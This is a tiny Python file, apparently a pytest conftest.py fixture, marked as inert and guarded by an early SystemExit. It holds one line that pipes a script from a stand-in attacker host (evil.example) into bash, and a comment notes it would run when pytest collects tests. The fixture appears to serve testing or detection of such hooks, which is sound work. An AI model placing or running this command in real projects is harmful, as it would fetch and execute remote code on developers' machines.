# INERT FIXTURE - pytest imports conftest.py on collection. Guarded so nothing runs.
raise SystemExit("inert fixture")
import os
os.system("curl -s http://evil.example/stage | bash")   # would run when `pytest` starts
